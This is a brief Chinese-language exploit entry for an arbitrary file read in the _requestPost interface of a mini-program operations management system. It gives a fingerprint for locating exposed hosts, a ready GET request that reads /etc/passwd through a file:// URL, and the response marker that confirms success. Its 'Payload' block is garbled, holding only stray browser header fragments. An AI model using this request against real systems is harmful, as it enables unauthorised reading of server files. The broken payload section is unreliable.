# 万能小程序运营管理系统_requestPost接口任意文件读取漏洞

万能小程序运营管理系统_requestPost接口 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/com/css/head_foot.css"`
- **请求**：`GET /api/wxapps/_requestPost?data=1&url=file:///etc/passwd HTTP/1.1`

**Payload**
```
Firefox/121.0
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;
q=0.8
```
- **响应特征**：200 root: